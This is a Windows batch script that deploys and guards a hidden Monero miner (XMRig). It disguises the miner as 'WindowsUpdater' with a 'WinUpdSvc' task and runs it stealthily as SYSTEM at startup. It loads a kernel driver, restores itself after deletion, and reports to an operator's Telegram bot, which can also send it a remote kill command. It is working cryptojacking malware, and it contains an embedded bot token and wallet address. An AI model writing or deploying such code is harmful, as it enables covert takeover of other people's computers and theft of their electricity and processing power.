@echo off
setlocal enabledelayedexpansion

:: ===================================================
:: MAX PERFORMANCE MONERO WATCHDOG (i5-14400, 16GB RAM)
:: - Self-repair (BIOS Echo) if deleted
:: - Telegram alerts for hashrate/shares every 7 min
:: - Password-protected kill (/kill takeover123)
:: - MSR mod + Huge Pages + Core Parking & HPET tweaks
:: - Stealth: Only visible on first run
:: ===================================================

:: === CONFIG ===
set "MUTEX_FILE=%TEMP%\xmrig_watchdog.lock"
set "XMRIG_PATH=C:\ProgramData\WindowsUpdater\xmrig.exe"
set "BACKUP=C:\ProgramData\WindowsUpdater\backup"
set "POOL=gulf.moneroocean.stream:10128"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "PASSWORD=%COMPUTERNAME%"
set "ALGO=rx/0"
set "API_PORT=16000"
set "TASK_NAME=WinUpdSvc"

:: Telegram
set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
set "TG_CHAT_ID=8112985977"

:: CPU tuning (i5-14400)
set "THREADS=12"
set "CPU_PRIORITY=4"
set "CPU_MAX_HINT=90"
set "AFFINITY_MASK=0x5555"
set "MSR_READY=0"

:: Kill command
set "KILL_PASS=takeover123"
set "KILL_FLAG=%TEMP%\miner_kill.flag"

:: Stats timer
set "STATS_TIMER=0"

:: === Prevent double instances ===
if exist "!MUTEX_FILE!" exit /b
echo locked > "!MUTEX_FILE!"

:: === System Tweaks (Max Performance) ===
:: Ultimate Performance power plan
powercfg /duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul 2>&1
powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61 >nul 2>&1

:: Disable Core Parking
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d 0 /f >nul 2>&1

:: Disable HPET
bcdedit /deletevalue useplatformclock >nul 2>&1

:: MSR Driver (WinRing0) – recreate if missing
sc stop WinRing0_1_2_0 >nul 2>&1
sc delete WinRing0_1_2_0 >nul 2>&1
timeout /t 1 >nul
if exist "C:\ProgramData\WindowsUpdater\winring0x64.sys" (
    sc create WinRing0_1_2_0 binPath= "\??\C:\ProgramData\WindowsUpdater\winring0x64.sys" type= kernel start= demand >nul 2>&1
    sc start WinRing0_1_2_0 >nul 2>&1
    "!XMRIG_PATH!" --msr-test >nul 2>&1 && set "MSR_READY=1"
)

:loop
:: === Self-Repair (BIOS Echo) ===
if not exist "!XMRIG_PATH!" (
    xcopy /Y /Q "%BACKUP%\*" "C:\ProgramData\WindowsUpdater\" >nul
    schtasks /create /tn "%TASK_NAME%" ^
        /tr "wscript.exe \"C:\ProgramData\WindowsUpdater\run_silent.vbs\"" ^
        /sc onstart /ru SYSTEM /rl HIGHEST /f
    curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" ^
        -d "chat_id=!TG_CHAT_ID!" -d "text=⚠️ *Miner Restored (BIOS Echo)* – Someone tried to delete it." ^
        -d "parse_mode=Markdown"
)

:: === Kill Command Check ===
for /f %%i in ('powershell -Command "try {Invoke-WebRequest -UseBasicParsing https://api.telegram.org/bot%TG_TOKEN%/getUpdates?offset=-1 | Select-String -Pattern '/kill %KILL_PASS%'} catch {''}"') do (
    echo Kill command detected.
    echo stop > "!KILL_FLAG!"
)

:: === Stop Miner if Kill Flag Exists ===
if exist "!KILL_FLAG!" (
    taskkill /f /im xmrig.exe >nul 2>&1
    del "!MUTEX_FILE!" >nul 2>&1
    exit /b
)

:: === Launch XMRig if Not Running ===
tasklist /fi "imagename eq xmrig.exe" | find /i "xmrig.exe" >nul
if errorlevel 1 (
    start /min /affinity !AFFINITY_MASK! "" "!XMRIG_PATH!" ^
        -o !POOL! -u !WALLET! -p !PASSWORD! -a !ALGO! -k ^
        --donate-level=0 --randomx-1gb-pages ^
        --threads=!THREADS! --cpu-priority=!CPU_PRIORITY! ^
        --cpu-max-threads-hint=!CPU_MAX_HINT! ^
        --msr --asm=auto:fast --randomx-mode=fast ^
        --randomx-init=1 --randomx-wrmsr=-1 --cpu-no-yield ^
        --http-port=!API_PORT! --max-cpu-usage=90
)

:: === Telegram Stats (every 7 min) ===
set /a STATS_TIMER+=30
if !STATS_TIMER! geq 420 (
    set "HASHRATE="
    for /f "tokens=* usebackq" %%H in (`powershell -Command ^
        "try { (Invoke-WebRequest -Uri http://127.0.0.1:%API_PORT%/2/summary -UseBasicParsing).Content } catch {''}"`) do set "HASHRATE=%%H"
    if defined HASHRATE (
        curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" ^
            -d "chat_id=!TG_CHAT_ID!" -d "text=💻 *Miner Stats:* `!HASHRATE!`" ^
            -d "parse_mode=Markdown"
    )
    set "STATS_TIMER=0"
)

timeout /t 30 >nul
goto loop
